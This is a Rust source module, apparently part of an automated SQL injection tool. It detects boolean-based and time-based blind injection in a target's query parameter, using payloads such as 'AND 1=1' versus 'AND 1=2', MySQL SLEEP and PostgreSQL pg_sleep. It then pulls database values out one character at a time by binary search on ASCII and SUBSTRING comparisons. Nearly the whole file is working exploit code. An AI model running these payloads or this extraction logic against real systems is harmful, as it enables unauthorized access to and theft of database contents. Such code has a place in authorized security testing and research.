//! Blind SQL injection inference

use crate::sqli::core::{DBMS, CHAR_START, CHAR_STOP};
use crate::sqli::request::{Request, page_ratio};
use anyhow::Result;
use std::time::{Duration, Instant};

/// Blind injection vector
#[derive(Debug, Clone)]
pub struct BlindVector {
    pub dbms: DBMS,
    pub prefix: String,
    pub suffix: String,
    pub true_code: String,    // Payload that returns true
    pub false_code: String,   // Payload that returns false
    pub time_based: bool,     // Use time-based instead of boolean
    pub delay: u64,           // Delay in seconds for time-based
}

/// Check if target is vulnerable to boolean-based blind SQLi
pub async fn check_boolean_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
    let baseline = request.query_page("1").await?;
    
    // Test true condition
    let true_page = request.query_page("1 AND 1=1-- -").await?;
    let true_ratio = page_ratio(&true_page, &baseline);
    
    // Test false condition
    let false_page = request.query_page("1 AND 1=2-- -").await?;
    let false_ratio = page_ratio(&false_page, &baseline);
    
    // If true is similar to baseline and false is different, we have boolean blind
    if true_ratio > 0.9 && false_ratio < 0.5 {
        return Ok(Some(BlindVector {
            dbms: DBMS::Unknown,
            prefix: "1".to_string(),
            suffix: "-- -".to_string(),
            true_code: "AND 1=1".to_string(),
            false_code: "AND 1=2".to_string(),
            time_based: false,
            delay: 0,
        }));
    }
    
    // Try with quotes
    let true_page = request.query_page("1' AND '1'='1").await?;
    let true_ratio = page_ratio(&true_page, &baseline);
    
    let false_page = request.query_page("1' AND '1'='2").await?;
    let false_ratio = page_ratio(&false_page, &baseline);
    
    if true_ratio > 0.9 && false_ratio < 0.5 {
        return Ok(Some(BlindVector {
            dbms: DBMS::Unknown,
            prefix: "1'".to_string(),
            suffix: "".to_string(),
            true_code: "AND '1'='1".to_string(),
            false_code: "AND '1'='2".to_string(),
            time_based: false,
            delay: 0,
        }));
    }
    
    Ok(None)
}

/// Check if target is vulnerable to time-based blind SQLi
pub async fn check_time_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
    let delay = 5u64;
    
    // Test without delay first
    let start = Instant::now();
    let _ = request.query_page("1").await?;
    let normal_time = start.elapsed();
    
    // Test MySQL SLEEP
    let start = Instant::now();
    let _ = request.query_page(&format!("1 AND SLEEP({})-- -", delay)).await?;
    let sleep_time = start.elapsed();
    
    if sleep_time > Duration::from_secs(delay - 1) && sleep_time > normal_time * 3 {
        return Ok(Some(BlindVector {
            dbms: DBMS::MySQL,
            prefix: "1".to_string(),
            suffix: "-- -".to_string(),
            true_code: format!("AND SLEEP({})", delay),
            false_code: "AND 1=1".to_string(),
            time_based: true,
            delay,
        }));
    }
    
    // Test PostgreSQL pg_sleep
    let start = Instant::now();
    let _ = request.query_page(&format!("1 AND (SELECT pg_sleep({}))-- -", delay)).await?;
    let sleep_time = start.elapsed();
    
    if sleep_time > Duration::from_secs(delay - 1) && sleep_time > normal_time * 3 {
        return Ok(Some(BlindVector {
            dbms: DBMS::PostgreSQL,
            prefix: "1".to_string(),
            suffix: "-- -".to_string(),
            true_code: format!("AND (SELECT pg_sleep({}))", delay),
            false_code: "AND 1=1".to_string(),
            time_based: true,
            delay,
        }));
    }
    
    Ok(None)
}

/// Extract a single character using boolean-based blind
pub async fn extract_char_boolean(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    position: usize,
    baseline: &str,
) -> Result<Option<char>> {
    // Binary search for character ASCII value
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low <= high {
        let mid = (low + high) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            DBMS::MSSQL => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            _ => {
                format!("{} AND ASCII(SUBSTR(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            }
        };
        
        let page = request.query_page(&payload).await?;
        let ratio = page_ratio(&page, baseline);
        
        if ratio > 0.9 {
            // True condition - character is greater than mid
            low = mid + 1;
        } else {
            // False condition - character is less than or equal to mid
            high = mid - 1;
        }
    }
    
    if low >= 32 && low <= 126 {
        Ok(Some(low as char))
    } else {
        Ok(None)
    }
}

/// Extract a single character using time-based blind
pub async fn extract_char_time(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    position: usize,
) -> Result<Option<char>> {
    let delay = vector.delay;
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low <= high {
        let mid = (low + high) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL => {
                format!("{} AND IF(ASCII(SUBSTRING(({}),{},1))>{},SLEEP({}),0){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND (SELECT CASE WHEN ASCII(SUBSTRING(({}),{},1))>{} THEN pg_sleep({}) ELSE pg_sleep(0) END){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            },
            _ => {
                format!("{} AND IF(ASCII(SUBSTRING(({}),{},1))>{},SLEEP({}),0){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            }
        };
        
        let start = Instant::now();
        let _ = request.query_page(&payload).await?;
        let elapsed = start.elapsed();
        
        if elapsed > Duration::from_secs(delay - 1) {
            // True condition - character is greater than mid
            low = mid + 1;
        } else {
            // False condition - character is less than or equal to mid
            high = mid - 1;
        }
    }
    
    if low >= 32 && low <= 126 {
        Ok(Some(low as char))
    } else {
        Ok(None)
    }
}

/// Extract full string using blind injection
pub async fn extract_string(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    max_length: usize,
) -> Result<String> {
    let baseline = request.query_page(&format!("{} {}", vector.prefix, vector.true_code)).await?;
    let mut result = String::new();
    
    for pos in 1..=max_length {
        let char = if vector.time_based {
            extract_char_time(request, vector, expression, pos).await?
        } else {
            extract_char_boolean(request, vector, expression, pos, &baseline).await?
        };
        
        match char {
            Some(c) if c != ' ' || !result.is_empty() => {
                result.push(c);
                tracing::debug!("Extracted character {}: '{}'", pos, c);
            },
            _ => break, // End of string
        }
    }
    
    Ok(result.trim().to_string())
}

/// Get length of expression result
pub async fn get_length(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
) -> Result<usize> {
    let baseline = request.query_page(&format!("{} {}", vector.prefix, vector.true_code)).await?;
    
    // Binary search for length
    let mut low = 0usize;
    let mut high = 1000usize;
    
    while low < high {
        let mid = (low + high + 1) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            },
            _ => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            }
        };
        
        let page = request.query_page(&payload).await?;
        let ratio = page_ratio(&page, &baseline);
        
        if ratio > 0.9 {
            low = mid;
        } else {
            high = mid - 1;
        }
    }
    
    Ok(low)
}
